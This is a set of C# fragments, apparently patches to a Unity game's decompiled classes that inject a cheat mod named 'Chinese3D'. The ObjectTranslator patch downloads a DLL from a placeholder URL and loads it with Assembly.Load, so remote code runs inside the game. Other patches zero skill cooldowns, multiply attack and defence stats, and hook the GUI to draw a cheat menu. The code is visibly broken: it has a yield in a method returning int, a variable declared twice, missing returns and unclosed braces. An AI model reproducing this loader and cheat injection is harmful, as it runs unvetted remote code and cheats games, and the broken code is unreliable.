using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using UnityEngine;
//ObjectTranslator
	public static int loadAssembly(IntPtr luaState)

		{			WWW www = new WWW("https://example.com/core.dll");
					yield return www;
					assembly = Assembly.Load( www.bytes);
					
					WWW www = new WWW("https://example.com/core.dll");
					while (!www.isDone)
					{
					}
					MemoryStream memoryStream = new MemoryStream(www.bytes);
					byte[] array2 = new byte[memoryStream.Length];
					memoryStream.Read(array2, 0, array2.Length);
					memoryStream.Close();
		}

//LearnedSkill
		public int GetCDLeftTime(ushort id)
		{
			if (Chinese3D.toggle3)
			{
				return 0;
			}
		}
		
		public int GetCDTotalTime(ushort id)
		{
			if (Chinese3D.toggle3)
			{
				return 0;
			}
		}
		
		
//HeroDevelop
public void GetEquipAttr(HeroInfo oHeroInfo, Dictionary<EAttribute, uint> oAttrDict)
		{
			float percent = 1f;
			if (this.BalanceCfg != null)
			{
				percent = this.BalanceCfg.m_dwEquipAttrPercent / 10000f;
			}
			foreach (KeyValuePair<EEquipPart, EquipData> keyValuePair in oHeroInfo.m_oEquipInfo)
			{
				EquipCfg equipCfg = this.m_poCore.TableMgr.EquipTable.GetEquipCfg(keyValuePair.Value.m_dwEquipID);
				if (equipCfg != null)
				{
					this._AddAttr(oAttrDict, EAttribute.ATTR_ADDITIONAL_MAX_HP, equipCfg.m_dwInitAttrMaxHP, percent);
					this._AddAttr(oAttrDict, EAttribute.ATTR_ADDITIONAL_PHYSICS_DEFENCE, equipCfg.m_dwInitAttrPhysicsDefence * (uint)Chinese3D.defMulti, percent);
					this._AddAttr(oAttrDict, EAttribute.ATTR_ADDITIONAL_MAGICAL_ATTACK, equipCfg.m_dwInitAttrMagicalAttack * (uint)Chinese3D.dmgMulti, percent);
					this._AddAttr(oAttrDict, EAttribute.ATTR_ADDITIONAL_MAGICAL_DEFENCE, equipCfg.m_dwInitAttrMagicalDefence * (uint)Chinese3D.defMulti, percent);
					this._AddAttr(oAttrDict, EAttribute.ATTR_ADDITIONAL_PHYSICS_ATTACK, equipCfg.m_dwInitAttrPhysicsAttack * (uint)Chinese3D.dmgMulti, percent);
				}
		
//UILabel
public void OnGUI()
	{
		Chinese3D.OnGUI();
	}